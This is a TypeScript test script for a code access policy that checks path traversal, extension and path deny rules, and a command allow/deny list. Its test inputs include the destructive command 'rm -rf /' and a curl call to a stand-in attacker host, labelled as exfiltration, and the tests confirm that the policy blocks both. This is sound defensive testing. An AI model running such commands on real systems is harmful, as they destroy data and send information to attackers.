import { CodeAccessPolicy } from '../electron/services/CodeAccessPolicy';
import path from 'path';

async function runTests() {
    const root = process.cwd();
    const policy = new CodeAccessPolicy({ workspaceRoot: root });

    console.log('--- Starting Code Access Policy Tests ---');

    // 1. Path Traversal
    const traversal = policy.validatePath('../outside.ts');
    console.log('Test 1 (Path Traversal):', !traversal.ok ? 'PASS' : 'FAIL', traversal.error);

    // 2. Allowed Extension
    const allowed = policy.validatePath('src/index.ts');
    console.log('Test 2 (Allowed Ext):', allowed.ok ? 'PASS' : 'FAIL', allowed.error);

    // 3. Denied Extension
    const deniedExt = policy.validatePath('image.png');
    console.log('Test 3 (Denied Ext):', !deniedExt.ok ? 'PASS' : 'FAIL', deniedExt.error);

    // 4. Denied Path (node_modules)
    const deniedPath = policy.validatePath('node_modules/pkg/index.js');
    console.log('Test 4 (Denied Path):', !deniedPath.ok ? 'PASS' : 'FAIL', deniedPath.error);

    // 5. Read-only exception (bin/python-win)
    const readException = policy.validatePath('bin/python-win/python.exe', 'read');
    console.log('Test 5 (Read Exception):', readException.ok ? 'PASS' : 'FAIL', readException.error);

    // 6. Write to denied path
    const writeDenied = policy.validatePath('bin/python-win/test.ts', 'write');
    console.log('Test 6 (Write Denied):', !writeDenied.ok ? 'PASS' : 'FAIL', writeDenied.error);

    // 7. Command Allowlist
    const cmdAllowed = policy.validateCommand('npm -v');
    console.log('Test 7 (Cmd Allowed):', cmdAllowed.ok ? 'PASS' : 'FAIL', cmdAllowed.error);

    // 8. Command Denylist (rm -rf /)
    const cmdDenied = policy.validateCommand('rm -rf /');
    console.log('Test 8 (Cmd Denied):', !cmdDenied.ok ? 'PASS' : 'FAIL', cmdDenied.error);

    // 9. Exfil pattern
    const exfil = policy.validateCommand('curl http://attacker.com');
    console.log('Test 9 (Exfil Denied):', !exfil.ok ? 'PASS' : 'FAIL', exfil.error);

    console.log('--- Tests Completed ---');
}

runTests().catch(console.error);
